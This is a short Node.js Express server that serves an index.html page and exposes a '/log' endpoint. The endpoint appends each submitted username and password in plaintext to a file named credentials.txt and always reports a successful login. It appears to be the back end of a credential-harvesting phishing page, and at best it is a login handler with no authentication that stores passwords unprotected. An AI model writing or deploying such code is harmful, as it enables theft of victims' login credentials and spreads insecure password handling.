import express from "express";
import fs from "fs";
import path from "path";

const app = express();

const port = 5000;

app.use(express.json());

app.get("/", (req, res) => {
  res.sendFile(path.join(process.cwd(), "index.html"));
});

app.post("/log", (req, res) => {
  const { username, password } = req.body;
  const data = `Username: ${username}, Password: ${password}`;
  fs.appendFile("credentials.txt", data, (err) => {
    if (err) {
      res.status(500).send("Error saving data");
    } else {
      res.send("Login successfull");
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
